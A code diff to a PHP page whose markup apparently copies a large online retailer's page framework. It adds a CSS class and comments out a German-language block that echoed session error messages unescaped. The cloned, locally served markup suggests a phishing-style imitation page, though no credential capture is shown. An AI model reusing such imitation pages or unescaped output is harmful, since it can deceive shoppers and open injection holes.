@@ -8,7 +8,7 @@
 ?>
 
 <!DOCTYPE html>
-<html class="a-ws a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition" data-aui-build-date="3.17.4.2-2017-03-18">
+<html class="a-ws a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember" data-aui-build-date="3.17.4.2-2017-03-18">
 	<head>
 		<meta http-equiv="content-type" content="text/html; charset=UTF-8">
 		<link rel="stylesheet" href="src/css/31O9784sOL.css">
@@ -150,7 +150,7 @@
 				</div>
 			</div>	
 
-			<div class="cs-step" id="orderSelect" style="display:<?php echo ((isset($_SESSION['errList']) && count($_SESSION['errList'] != 0)) ? "block" : "none") ?>">
+<!-- 			<div class="cs-step" id="orderSelect" style="display:<?php echo ((isset($_SESSION['errList']) && count($_SESSION['errList'] != 0)) ? "block" : "none") ?>">
 				<div id="orderUnrelatedArea" class="newOrderSummary" style="width:510px;margin:0 auto;background-color:#FFFFDD;border: 1px solid #A31919">
 					<table class="newOrderTable" cellspacing="0" cellpadding="0" border="0">
 						<tbody>
@@ -160,14 +160,14 @@
 									<span style="background-position-y: -75px"></span>
 									<h6>Es ist ein Fehler aufgetreten:</h6>
 									<ul style="color:#A31919">
-										<?php
+										<?php /*
 											if (isset($_SESSION['errList'])) {
 												for ($i = 0; $i < count($_SESSION['errList']); $i++) {
 													echo '<li>' . $_SESSION['errList'][$i] . '</li>';
 												}
 												
 												unset($_SESSION['errList']);
-											}
+											} */
 										?>
 									</ul>
 								</div>
@@ -176,7 +176,7 @@
 						</tbody>
 					</table>                                                                           
 				</div>
-			</div>
+			</div> -->
 				
 			<div class="cu-eb-top" style="width:520px;margin:0 auto">
 				<div class="cu-eb-top-left cu-eb-top-left-3"></div>
